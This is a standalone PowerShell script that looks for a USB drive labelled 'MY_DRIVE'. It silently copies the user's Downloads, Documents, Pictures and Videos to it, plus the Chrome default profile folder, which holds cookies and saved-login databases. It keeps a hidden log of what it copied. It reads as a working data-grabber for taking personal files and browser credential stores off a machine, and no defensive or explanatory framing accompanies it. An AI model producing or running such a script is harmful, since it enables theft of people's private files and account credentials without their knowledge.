param(
    [string]$DriveLabel = 'MY_DRIVE',
    [string[]]$SourceFolders = @(
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos",
        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
    ),
    [string]$DestinationSubfolder = 'Data',
    [long]$MaxFileSize = 10485760
)

function Write-Log {
    param(
        [string]$Message,
        [string]$LogPath
    )
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    Add-Content -Path $LogPath -Value "[$timestamp] $Message"
}

$drive = [System.IO.DriveInfo]::GetDrives() | Where-Object {
    $_.DriveType -eq 'Removable' -and $_.IsReady -and $_.VolumeLabel -eq $DriveLabel
} | Select-Object -First 1

if ($drive) {
    $destRoot = Join-Path $drive.Name $DestinationSubfolder
    if (-not (Test-Path $destRoot)) { New-Item -Path $destRoot -ItemType Directory -Force | Out-Null }
    $logFile = Join-Path $destRoot "log.txt"
    if (-not (Test-Path $logFile)) {
        New-Item -Path $logFile -ItemType File -Force | Out-Null
        (Get-Item $logFile).Attributes += 'Hidden'
    }
    Write-Log "USB drive '$DriveLabel' detected at $($drive.Name)" $logFile
    Write-Log "Execution started." $logFile

    foreach ($folder in $SourceFolders) {
        if (Test-Path $folder) {
            $subfolderName = Split-Path $folder -Leaf
            $dest = Join-Path $destRoot $subfolderName
            if (-not (Test-Path $dest)) {
                New-Item -Path $dest -ItemType Directory -Force | Out-Null
                Write-Log "Created folder: $dest" $logFile
            }
            $filesToCopy = New-Object System.Collections.Generic.List[string]
            foreach ($file in [System.IO.Directory]::EnumerateFiles($folder)) {
                try {
                    $fi = [System.IO.FileInfo] $file
                    if ($fi.Length -lt $MaxFileSize) { $filesToCopy.Add($file) }
                }
                catch {
                    Write-Log "Error accessing: $file" $logFile
                }
            }
            if ($filesToCopy.Count -gt 0) {
                Copy-Item -Path $filesToCopy.ToArray() -Destination $dest -Force
                Write-Log "Copied $($filesToCopy.Count) file(s) from $folder to $dest" $logFile
            }
        }
        else {
            Write-Log "Folder not found: $folder" $logFile
        }
    }
    Write-Log "Operation completed successfully." $logFile
}
else {
    $tempLog = Join-Path $env:TEMP "usb_log.txt"
    "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))] USB drive '$DriveLabel' not found." | Out-File -FilePath $tempLog -Append
}
